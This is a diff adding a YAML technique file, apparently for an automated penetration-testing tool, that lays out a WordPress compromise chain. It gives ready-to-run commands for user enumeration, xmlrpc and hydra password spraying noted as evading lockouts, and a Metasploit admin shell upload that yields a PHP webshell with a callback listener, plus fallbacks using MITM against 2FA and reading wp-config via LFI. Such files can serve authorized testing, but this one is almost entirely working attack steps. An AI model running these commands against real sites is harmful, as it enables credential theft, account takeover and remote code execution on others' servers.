@@ -1,0 +1,49 @@
+id: tech_wordpress
+title: "WordPress full-stack enumeration + exploitation chain"
+phase: exploit
+mitre: ["T1190", "T1078", "T1505.003"]
+trigger:
+  services: ["http", "https"]
+  ports:    [80, 443, 8080, 8443]
+  technologies: ["wordpress", "wp-content", "wp-login.php", "wp-json"]
+  cves: []
+keywords:
+  - "wordpress"
+  - "wp-login"
+  - "wpscan"
+  - "xmlrpc"
+  - "wp-json"
+  - "wpscan api"
+preconditions:
+  - "/wp-login.php OR /wp-content/ confirmed reachable"
+  - "WPScan API token available (env: WPSCAN_API_TOKEN) for vuln data"
+steps:
+  - tool: wpscan
+    cmd:  "wpscan --url {base_url} --enumerate vp,vt,u1-50,cb,dbe --random-user-agent --plugins-detection mixed"
+    why:  "Vulnerable plugins, themes, users, config-backup files"
+  - tool: curl
+    cmd:  "curl -s {base_url}/?author=1 -L -o /dev/null -w '%{redirect_url}\\n'"
+    why:  "Author-id enumeration via 301 redirect (works even when WPScan blocked)"
+  - tool: curl
+    cmd:  "curl -s {base_url}/wp-json/wp/v2/users"
+    why:  "Public REST API leaks usernames on most installs"
+  - tool: curl
+    cmd:  "curl -s -X POST {base_url}/xmlrpc.php -d '<methodCall><methodName>system.listMethods</methodName><params></params></methodCall>'"
+    why:  "Confirm xmlrpc enabled — wp.getUsersBlogs supports password spray w/o lockouts"
+  - tool: hydra
+    cmd:  "hydra -L users.txt -P passwords.txt {target} http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In:F=incorrect'"
+    why:  "Login bruteforce against /wp-login.php"
+  - tool: msfconsole
+    cmd:  "msfconsole -qx 'use auxiliary/scanner/http/wordpress_xmlrpc_login; set RHOSTS {target}; set USER_FILE users.txt; set PASS_FILE passwords.txt; run'"
+    why:  "xmlrpc login spray — bypasses Login Lockdown plugins"
+  - tool: msfconsole
+    cmd:  "msfconsole -qx 'use exploit/unix/webapp/wp_admin_shell_upload; set RHOSTS {target}; set USERNAME admin; set PASSWORD found_pass; set TARGETURI /; set LHOST {LHOST}; set LPORT {LPORT}; run'"
+    why:  "Admin → PHP shell via theme editor (post-creds)"
+expected_outcome: "Admin credential → PHP webshell as web user (``www-data``/``apache``)"
+fallbacks:
+  - "If WPScan API blocked → grep wp-content/plugins/*/readme.txt for plugin versions; cross-check WPVulnDB manually"
+  - "If MFA / 2FA active → look for MITM via wp-login + plain HTTP"
+  - "Stuck creds → check /wp-config.php via LFI, then DB-direct password reset"
+references:
+  - "https://wpscan.com/"
+  - "https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/wordpress"
